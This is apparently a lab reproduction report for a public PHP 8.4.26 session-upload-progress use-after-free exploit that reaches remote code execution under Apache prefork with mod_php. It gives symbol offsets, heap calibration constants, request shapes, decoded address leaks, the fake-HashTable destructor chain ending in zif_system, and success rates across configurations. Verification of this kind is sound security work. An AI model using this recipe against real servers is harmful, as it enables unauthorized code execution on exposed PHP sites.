# 9bie `php2shell-bypass-aslr-exp` — private-lab reproduction

**Receipt:** `9bie_20261022T024258Z`
**Date:** 2026-10-22 (UTC)
**PoC:** https://github.com/9bie/php2shell-bypass-aslr-exp @ `4586f5cc120c82fd468b17469202bac629810ad9`
**Target:** official `php:8.4.26-apache` (`php@sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a`, image built 2026-10-21T00:32Z, PHP 8.4.26 NTS, Apache 2.4.69, Debian 12, prefork + mod_php)
**Isolation:** four new localhost-only containers (`127.0.0.1:18088–18091`); no existing container or shared service was modified; no repo commit/push.

---

## 0. Verdict

| Step | Result |
|---|---|
| 1. Exact public PoC on `php:8.4.26-apache`, single worker | **Reproduced.** Both `Set-Cookie` OOB leaks and `uid=33(www-data)` obtained. **3/3 one-shot** with the official-image calibration, matching the author's claim. |
| 2. `display_errors=Off` (production default) with the published heap-leak variant | **Complete chain does not work.** The classic chain loses its leak. The published no-display OOM-in-cookie variant did not produce an OOB cookie on the official image with any published shape. Exact blockers in §2. |
| 3. Multi-worker default prefork | **Reliability drops to 1/5 end-to-end** (0/5 one-shot); the successful run needed retries at all three stages. |
| 3b. Worker rotation (`MaxConnectionsPerChild=1`) | **0/3**; all runs fail at the heap leak because A and B cannot share a worker. |

ASLR was on (`randomize_va_space=2`) for every run; no `setarch -R`, no gdb in the exploit path.

---

## 1. Exact reproduction (step 1)

### 1.1 Environment

The shipped `docker/php.ini` and `docker/apache.conf` were used with the official image; only the host port and container name were changed:

```
display_errors=On, display_startup_errors=On, error_reporting=E_ALL
memory_limit=8M, post_max_size=64M, upload_max_filesize=64M
session.save_path=/tmp, session.use_strict_mode=0, session.use_cookies=1
session.upload_progress.enabled=On, session.upload_progress.cleanup=On
KeepAlive Off; StartServers/MinSpareServers/MaxSpareServers/MaxRequestWorkers/ServerLimit = 1
MaxConnectionsPerChild=0
```

Target page is only `<?php echo "OK\n"; ?>` — no `session_start()`, no application code.

### 1.2 Offsets

`docker cp` fails on this host with a read-only-bind remount error, so `docker/offsets.py` could not auto-derive the symbols. `libphp.so` was copied with `docker exec ... cat` and parsed with `nm`/`readelf`:

| Symbol | Address in `libphp.so` | Notes |
|---|---|---|
| `zif_system` | **0x465370** | local `t` |
| `zval_ptr_dtor` | **0x65eb60** | global `T`, stage-2 leak anchor |
| `zend_hash_destroy` | 0x6138f0 | reference only |

PT_LOAD min vaddr is `0x0`, so symbol values are file/chunk-relative offsets. These match the README's official-image values (`0x465370` / `0x65eb60`). The first run used the repo's lab defaults (`0x43a870`/`0x613c50`) because auto-derivation failed, and stage 2 correctly rejected the leak (`run1_bad_offsets.log`); all reported runs use the values above.

Other official-image calibration constants used by `exploit.py --profile bookworm`:

```
stage1_n = 841          stage2_t = 406        stage2_v = 16
HTDATA   = chunk+0x690d8
stage3   = 6 pads (name 31 / value 31), extra Cookie: PHPSESSID=<32 a's>
           B: 2x15B filler + 15B carrier + 15x167B fake HashTable
MAX_CMD  = 14 bytes
```

### 1.3 Request sequence (instrumented run, `evidence/leaks_and_sequence.txt`)

Every request is a `multipart/form-data` POST to `/index.php`, `Connection: close`. The A/B pairs must be served by the **same** prefork child; each `rotate` pair deliberately aborts the current child over HTTP so prefork forks a fresh one.

| # | Phase | Body | Parts | Response | Cookie after decode |
|---|---|---:|---:|---:|---|
| 1 | rotate A | 15,657,436 | 1005 | 693 | — (warning + OOM text) |
| 2 | rotate B | 192 | 2 | 0 | — (child aborts) |
| 3 | stage-1 A | 12,655,437 | 1005 | 693 | — |
| 4 | stage-1 B | 93,685 | 844 | 12,227 | **4096 B, 98 pointers** |
| 5 | rotate A | 15,657,436 | 1005 | 693 | — |
| 6 | rotate B | 192 | 2 | 0 | — |
| 7 | stage-2 A | 12,693,475 | 1005 | 693 | — |
| 8 | stage-2 B | 83,032 | 1000 | 857 | **16 B: nTableSize + pDestructor** |
| 9 | rotate A | 15,657,436 | 1005 | 693 | — |
| 10 | rotate B | 192 | 2 | 0 | — |
| 11 | stage-3 A | 12,584,151 | 10 | 367 | — |
| 12 | stage-3 B | 4,278 | 20 | 0 | **zif_system executes** |

Request shapes:

- **A (all stages):** 1001 small fields, `PHPSESSID=\x00` (1 byte), `PHP_SESSION_UPLOAD_PROGRESS=pwn`, a 64-byte file part, and a **12 MiB** field. The `max_input_vars` warning sets `SG(headers_sent)`, `php_session_send_cookie()` returns FAILURE, `PS(send_cookie)` stays 1, and the 12 MiB field OOMs inside `php_session_initialize()` at request startup. Fatal line observed: `Allowed memory size of 8388608 bytes exhausted (tried to allocate 2098791 bytes) in Unknown on line 0`.
- **Stage-1 B:** `PHPSESSID=attacksessionid0001`, progress, **841** 48-byte fields, plus field `1999` = 79-byte forged buffer (`len=0x1000` at offset 0x10, `L` at 0x18). The stale id is reclaimed and `php_url_encode()` reads out of bounds into the cookie.
- **Stage-2 B:** same header fields + **983** array fields; index `a0406` has 16 elements of 16 bytes. `ZSTR_LEN(PS(id))` reads `nTableSize=16`, and the data area is `nNextFreeElement|pDestructor`.
- **Stage-3 A:** 19-byte `PHPSESSID`, progress, 6 `(name 31, value 31)` pads, file, 12 MiB field, plus `Cookie: PHPSESSID=<32 a's>` so B reuses the stale id and no `Set-Cookie` header is allocated over `val.type`.
- **Stage-3 B:** 15-byte carrier rewrites the low 7 bytes of the dangling `val.value`, then 15 live 167-byte strings carry the fake HashTable (`pDestructor = zif_system`, fake `execute_data`, fake `zend_string` containing `id>/out/p1`).

### 1.4 Leak evidence

**Stage 1 — Zend MM chunk base.** Decoded `Set-Cookie` is exactly 4096 bytes with 98 heap pointers; all 98 agree on one 2 MiB-aligned base:

```
decoded length : 4096
pointers       : 98  (all 0x7f....)
modes          : 0x7f1838000000 x98
first          : 0x7f18380a70a0 @ 56, 0x7f18380a70c0 @ 104, ...
=> chunk base  : 0x7f1838000000
```

**Stage 2 — libphp base.** Decoded `Set-Cookie` is 16 bytes:

```
hex            : 1000000000000000 60db283a187f0000
bytes[0:8]     : 0x10                 (HashTable nTableSize = 16)
bytes[8:16]    : 0x7f183a28db60       (pDestructor = libphp + 0x65eb60)
low12 check    : 0xb60 matches
=> libphp base : 0x7f1839c2f000
```

**Stage 3 — addresses and trigger.** In the same run:

```
chunk               = 0x7f1838000000
HTDATA = chunk+0x690d8 = 0x7f18380690d8
libphp              = 0x7f1839c2f000
ZIF    = libphp+0x465370 = 0x7f183a094370
DTOR   = libphp+0x65eb60 = 0x7f183a28db60

php_session_track_init()
  zval_ptr_dtor(PS(http_session_vars))        # dangling reference
    zend_reference_destroy()
      zval_ptr_dtor(&ref->val)                # IS_ARRAY_EX
        zend_array_destroy(fake HT)
          zend_hash_destroy(fake HT)
            pDestructor(&bucket->val)         # zif_system
```

The stage-3 B request returns 0 bytes (the connection is torn down after the destructor chain), but the command has already run. Fresh proof file (54 bytes):

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Worker rotation is visible in the captured PIDs: rotate B kills the child (304 → dead), prefork forks 370 for stage 2, then 435 for stage 3. The chunk and libphp bases are stable across forked workers because they inherit the same mappings; the bases change only when the container/master restarts.

### 1.5 Reliability (single worker)

Three independent runs with distinct proof files, each starting from the exploit's HTTP pre-rotation:

| Run | Stage 1 | Stage 2 | Stage 3 | Proof |
|---|---|---|---|---|
| 1 | attempt 1/3 | attempt 1/3 | W3 attempt 1 | `uid=33(www-data)` |
| 2 | attempt 1/3 | attempt 1/3 | W3 attempt 1 | `uid=33(www-data)` |
| 3 | attempt 1/3 | attempt 1/3 | W3 attempt 1 | `uid=33(www-data)` |

**3/3 one-shot**, same bases each run (`0x7f1838000000` / `0x7f1839c2f000`). This directly confirms the author's "official image 3/3" claim. The author's separate 5/5, 9/10 and 10/10 ASLR rates were not re-tested as distinct scenarios.

---

## 2. `display_errors=Off` (production default)

Container `9bie-lab-off` (`127.0.0.1:18089`) is identical except `display_errors=Off`, `display_startup_errors=Off`. `log_errors=0` in this image, so failures were diagnosed from status codes and cookie shapes, not logs.

### 2.1 Classic chain

```
stage 1 attempt 1/2: heap leak missed
stage 1 attempt 2/2: heap leak missed
HEAP_LEAK_FAILED
```

Request-level capture (`evidence/display_errors_off/classic_stage1_capture/`):

- A: **500**, 275-byte body, **normal 32-char `Set-Cookie`** (`PHPSESSID=9585...`), no warning output.
- B: **200**, 195 bytes, **no `Set-Cookie` at all**.
- One earlier run produced `zend_mm_heap corrupted` and a child `SIGABRT`, so the dangling state still exists; it is simply not turned into a cookie read.

### 2.2 Published OOM-in-cookie variant

The repo's `DISPLAY_ERRORS_OFF.md` publishes an OOM-in-cookie A (`send_a_oom5.py`) and a B (`send_b_open.py`) that do not need warning output. The documented lab command is `0 62 235 15000 204 0 4000 103` for A, with B `N=160 VL=231` and optional `BB1_LEN=1048551 BF_P1=256 BF_READ=4000` / `BVAL_OFF=0x78 BVAL_LEN=0x4000`. These were run against the official image:

| A shape (F S NB BL X K KL FL) | A result | B result (all published shapes) |
|---|---|---|
| `0 62 235 15000 204 0 4000 103` (documented) | **200**, normal 32-char cookie — **no OOM** | 200, normal **32-byte** cookie |
| `0 62 238/242/246/250/254/258/262/268 15000 204 0 4000 103` | **500**, empty body, no `Set-Cookie`; worker survives | 200, normal **32-byte** cookie |

B shapes tried after A at NB=235/236/238: plain `160 231`, value-forge `BVAL_OFF=0x78 BVAL_LEN=0x4000`, buffer-forge `BB1_LEN=1048551 BF_P1=256 BF_READ=4000`, and both. **Every B response was the normal 32-character session id (62-byte header), never the 4000-byte or 16384-byte OOB read.**

### 2.3 Exact blocker

1. **The classic leak depends on a displayed warning.** With `display_errors=Off`, the `max_input_vars` diagnostic is not emitted, so `SG(headers_sent)` stays 0. `php_session_send_cookie()` succeeds, `php_session_reset_id()` returns SUCCESS, and `PS(send_cookie)` is cleared. A still OOMs, but B's pre-RINIT `php_session_initialize()` never calls the cookie path — hence no OOB read. This is measured: A sends a normal cookie, B sends none.
2. **The alternative OOM-in-cookie path is only a partial primitive.** The repo itself says the full `display_errors=0` RCE "will be committed later". `DISPLAY_ERRORS_OFF.md` §6.4 names two unsolved stage-2 constraints: (a) the bin-56 free-list must be drained so a 56-byte HashTable lands in the page-128 slot 2 (`PS(id)=page128+0x80`), while array key/value strings do not steal page 128; (b) the stale `ps_files` at page 127 must be reclaimed safely before B's `ps_close_files()`, or `zend_mm_panic`/`SIGSEGV` results. On the official image the documented A shape does not even reach OOM, and the nearby OOM shapes plus all published B forge shapes produce no OOB cookie. This is a calibration/primitive gap, not proof that the bug is unexploitable with a different heap layout.

**Conclusion:** with the published artifacts, the complete chain does **not** work under `display_errors=Off`. The blocker is the lost `headers_sent`-driven `reset_id` failure, plus the unpublished/uncalibrated stage-2 for the OOM-in-cookie alternative. This does not contradict PHP's GHSA position that the CVE itself does not require diagnostics; it is a limitation of this PoC.

---

## 3. Multi-worker prefork and worker rotation

### 3.1 Normal default prefork (5 workers)

Container `9bie-lab-mw` (`127.0.0.1:18090`) uses the image's stock `mpm_prefork.conf`: `StartServers 5`, `MinSpareServers 5`, `MaxSpareServers 10`, `MaxRequestWorkers 150`, `MaxConnectionsPerChild 0`. Five children were present (e.g. PIDs 18–22).

Instrumented capture (`evidence/multi_worker/capture_mw2/`):

- Stage-1 B returned **0 bytes** (no cookie), chunk base 0.
- Stage-2 B returned a **262-byte cookie with 5 pointers**, not the 16-byte `pDestructor` cookie; libphp base 0.
- No proof. With several idle children, A/B adjacency is not guaranteed; the observed B responses had no usable leak, and the pool churned as aborted children were replaced.

Five independent exploit runs:

| Run | Outcome | Detail |
|---|---|---|
| 1 | **success** | stage 1 attempt 2, stage 2 attempt 2, stage 3 attempt 3 → `uid=33(www-data)` |
| 2 | fail | stage 1 ok (attempt 2), libphp 0/3 |
| 3 | fail | heap 0/3 |
| 4 | fail | heap 0/3 |
| 5 | fail | heap 0/3 |

**1/5 end-to-end (20%); 0/5 one-shot.** The successful run required retries at every stage. This is consistent with the mechanism: prefork can hand adjacent connections to different children, and only A→B on the *same* child carries the stale `PS(http_session_vars)`/`PS(id)` state. Retries eventually align a pair, but the aborted children and poisoned heap reduce the pool over time.

### 3.2 Worker rotation

Container `9bie-lab-rot` (`127.0.0.1:18091`) sets `MaxConnectionsPerChild=1` with one worker. Every request is handled by a fresh child (observed: `pid 28` → defunct, new child for the next request).

```
run 1: heap 0/2 -> HEAP_LEAK_FAILED
run 2: heap 0/2 -> HEAP_LEAK_FAILED
run 3: heap 0/2 -> HEAP_LEAK_FAILED
```

**0/3.** Rotating the worker between A and B destroys the cross-request state the chain requires. The exploit's own HTTP pre-rotation is different and works: it intentionally aborts one child and lets prefork fork a replacement that inherits the same mappings; `MaxConnectionsPerChild=1` prevents any A/B pair from sharing a child.

---

## 4. Prerequisites (as measured)

- Apache prefork + **mod_php**; PHP 8.4.26 (pre-8.4.27). Same child must serve the A and B request of each pair.
- `display_errors=1` for the public chain; `memory_limit=8M`; `max_input_vars=1000`; `post_max_size`/`upload_max_filesize` large enough for the 12 MiB field.
- `session.upload_progress.enabled=1` (default), `session.use_cookies=1`, `session.use_strict_mode=0`, files save handler. **No `session_start()` and no application code required**; the page can be `<?php echo "OK\n"; ?>`.
- Heap calibration must match the exact image/build: stage-1 filler count 841, stage-2 target 406 with 16-byte elements, `HTDATA=chunk+0x690d8`, 6 `(31,31)` pads, 15-byte carrier, 32-char extra `Cookie`. Offsets `zif_system`/`zval_ptr_dtor` must be read from the target's `libphp.so`.
- Payload command ≤ **14 bytes** (167-byte carrier minus header/NUL). Longer commands require a short trigger such as `sh</out/c`.
- A writable path visible to the worker for proof (`/out` mount), owned by `www-data`.
- ASLR does not need to be disabled: the two cookies leak the chunk and libphp bases.

---

## 5. Blockers and caveats

- **`display_errors=Off`:** complete chain not reproduced; see §2.3. The classic leak is structurally dependent on the displayed warning, and the no-display alternative is explicitly unfinished in the repo. The published A calibration also does not transfer to the official image (documented NB=235 returns 200; the OOM window on this image starts between NB=235 and NB=238).
- **Multi-worker:** worker affinity is the limiting factor. 1/5 with 3 retries, 0/5 one-shot. The official PHP advisory says multi-worker prefork is exploitable; this PoC's A/B pairing makes it probabilistic rather than impossible.
- **Worker recycling:** `MaxConnectionsPerChild=1` gives 0/3, as expected.
- **Build specificity:** heap offsets/counts are per image. The repo's `docker/offsets.py` failed here only because `docker cp` hit a read-only-bind remount; the offsets were derived manually and match the README.
- **Not tested:** fixed 8.4.27 control, PHP-FPM, other SAPIs, 32-bit, the author's minimal Apache 2.4.68 lab build, or the author's 5/5–10/10 ASLR scenarios. No gdb was used in the exploit path.
- **False-positive caught:** an early multi-worker capture printed a `PROOF` that was a stale file from a previous single-worker run. The harness now deletes the proof before each run and checks mtime; `capture_mw2` correctly reports `NO PROOF`.

---

## 6. Receipt contents

```
report.md                     this file
metadata.txt                  image digest, repo commit, symbols, containers, ASLR
evidence/
  leaks_and_sequence.txt      decoded request table + both leak decodes + address math
  single_worker/              run2.log, sw_oneshot.log, sw_run_{1,2,3}.log,
                              proof_sw{1,2,3}.txt,
                              capture_clean/ (requests.json + 12 raw responses)
  display_errors_off/         off_classic.log, off_probe.log,
                              classic_stage1_capture/, off_variant/ (A/B logs, responses)
  multi_worker/               capture_mw2/, capture_mw2.log, mw_reliability.log,
                              mw_run_{1..5}.log, proof_mw1.txt
  rotation/                   rot_reliability.log, rot_run_{1..3}.log
lab_config/                   php On/Off, single-worker, MaxConnectionsPerChild=1, index.php
scripts/                      capture_stages.py, off_probe.py, probe_a.py,
                              send_a_oom5.py, send_b_open.py (port-patched)
SHA256SUMS                    hashes of every file above
```

Safety: all targets were containers created for this receipt on `127.0.0.1`; the only payload executed was `id` writing a proof file. No existing service, container, repository, or external host was touched. No commit or push was made. The four lab containers were **stopped after capture**; no exploit target remains running.
